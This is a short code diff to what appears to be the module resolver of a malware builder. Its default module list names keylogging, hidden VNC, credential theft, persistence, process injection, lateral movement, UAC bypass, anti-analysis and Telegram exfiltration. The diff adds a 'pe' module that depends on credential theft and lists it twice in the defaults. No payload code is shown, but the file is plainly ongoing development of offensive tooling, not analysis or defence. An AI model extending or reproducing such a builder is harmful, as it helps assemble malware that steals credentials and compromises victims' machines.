@@ -279,6 +279,7 @@ const MODULE_DEPS = {
   keylog: [],
   ws: [],
   autoesc: ['esc', 'uac'],
+  pe: ['creds'],
 };
 
 /** Resolve the requested module list to a closed dependency set. */
@@ -286,7 +287,7 @@ function resolveModules(opts) {
   const set = new Set(['core']);
   const requested = String(
     opts.modules === undefined || opts.modules === '' || opts.modules === 'all'
-      ? 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram,overlay'
+      ? 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram,overlay,pe,pe'
       : opts.modules
   ).split(',').map((m) => m.trim().toLowerCase()).filter(Boolean);
   for (const m of requested) set.add(m);
